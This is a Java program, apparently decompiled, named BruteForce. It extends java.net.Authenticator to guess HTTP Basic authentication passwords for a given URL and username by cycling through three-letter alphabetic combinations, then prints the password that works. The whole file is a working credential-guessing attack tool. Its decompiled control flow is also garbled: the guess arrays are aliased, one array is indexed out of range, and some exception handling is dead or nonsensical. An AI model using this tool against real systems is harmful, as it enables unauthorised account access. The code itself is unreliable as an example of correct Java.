public class BruteForce extends java.net.Authenticator {
    private String a;
    private java.net.URL b;
    private char[] c;
    private char[] d;
    public static void main ( String[] a0 ) {
        BruteForce a1 = null;
        if ( a0.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        String s = a0[0];
        String s0 = a0[1];
        try {
            a1 = new BruteForce ( s, s0 );
        } catch ( java.net.MalformedURLException a2 ) {
            a2.printStackTrace();
            System.exit ( 1 );
            a1 = null;
        }
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) a1 );
        java.net.URL a3 = a1.b;
        try {
            java.net.HttpURLConnection a4 = ( java.net.HttpURLConnection ) a3.openConnection();
            a4.connect();
            while ( a4.getResponseCode() == 401 ) {
                if ( a1.c == null ) {
                    break;
                }
                label0: {
                    NullPointerException a5 = null;
                    try {
                        try {
                            a4.getInputStream();
                            a4.connect();
                            continue;
                        } catch ( java.net.ProtocolException ignoredException ) {
                            break label0;
                        }
                    } catch ( NullPointerException a6 ) {
                        a5 = a6;
                    }
                    a5.printStackTrace();
                    System.exit ( 1 );
                    continue;
                }
                a4 = ( java.net.HttpURLConnection ) a1.b.openConnection();
            }
        } catch ( java.io.IOException a7 ) {
            a7.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( new StringBuilder ( "password=" ).append ( new String ( a1.d ) ).toString() );
        System.exit ( 0 );
    }
    private BruteForce ( String s, String s0 ) {
        super();
        this.b = new java.net.URL ( s );
        this.a = s0;
        char[] a0 = new char[1];
        a0[0] = ( char ) 97;
        this.c = a0;
    }
    public java.net.PasswordAuthentication getPasswordAuthentication() {
        if ( this.d != null ) {
            this.d = this.c;
            int i = this.c[2];
            if ( i != 90 ) {
                int i0 = this.c[2];
                if ( i0 == 122 ) {
                    this.c[2] = ( char ) 65;
                    int i1 = this.c[1];
                    if ( i1 != 90 ) {
                        int i2 = this.c[1];
                        if ( i2 == 122 ) {
                            this.c[1] = ( char ) 65;
                            int i3 = this.c[0];
                            if ( i3 != 90 ) {
                                int i4 = this.c[0];
                                if ( i4 == 122 ) {
                                    this.c = null;
                                } else {
                                    int i5 = this.c[0];
                                    int i6 = i5 + 1;
                                    char[] a0 = this.c;
                                    int i7 = ( char ) i6;
                                    a0[0] = ( char ) i7;
                                }
                            } else {
                                this.c[0] = ( char ) 97;
                            }
                        } else {
                            int i8 = this.c[1];
                            int i9 = i8 + 1;
                            char[] a1 = this.c;
                            int i10 = ( char ) i9;
                            a1[1] = ( char ) i10;
                        }
                    } else {
                        this.c[1] = ( char ) 97;
                    }
                } else {
                    int i11 = this.c[2];
                    int i12 = i11 + 1;
                    char[] a2 = this.c;
                    int i13 = ( char ) i12;
                    a2[2] = ( char ) i13;
                }
            } else {
                this.c[2] = ( char ) 97;
            }
        } else {
            char[] a3 = new char[3];
            a3[0] = ( char ) 65;
            a3[1] = ( char ) 65;
            a3[2] = ( char ) 65;
            this.d = a3;
            char[] a4 = new char[3];
            a4[0] = ( char ) 65;
            a4[1] = ( char ) 65;
            a4[2] = ( char ) 66;
            this.c = a4;
        }
        return new java.net.PasswordAuthentication ( this.a, this.d );
    }
}
